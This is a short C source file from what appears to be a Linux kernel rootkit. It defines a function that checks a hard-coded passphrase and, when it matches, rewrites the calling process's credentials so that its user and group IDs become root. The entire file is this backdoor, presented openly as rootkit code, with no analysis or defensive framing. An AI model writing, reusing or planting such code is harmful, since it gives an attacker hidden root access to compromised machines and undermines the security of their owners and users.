// Copyright (c) 2020 Marco Wang <m.aesophor@gmail.com>
#include "privesc.h"

#include <linux/cred.h>

#define PRIVESC_PASS "Hail Satan!"


/**
 * satan_privesc_root() - Gives the user's process root credential.
 * @passphrase: rootkit's passphrase for privilege escalation.
 *
 * Return: zero on success and non-zero otherwise.
 */
int satan_privesc_root(const char *passphrase)
{
        if (strncmp(passphrase, PRIVESC_PASS, strlen(PRIVESC_PASS))) {
                return 1;
        }

	cred = (struct cred *) __task_cred(current);
	cred->uid = cred->euid = cred->fsuid = GLOBAL_ROOT_UID;
	cred->gid = cred->egid = cred->fsgid = GLOBAL_ROOT_GID;
        return 0;
}
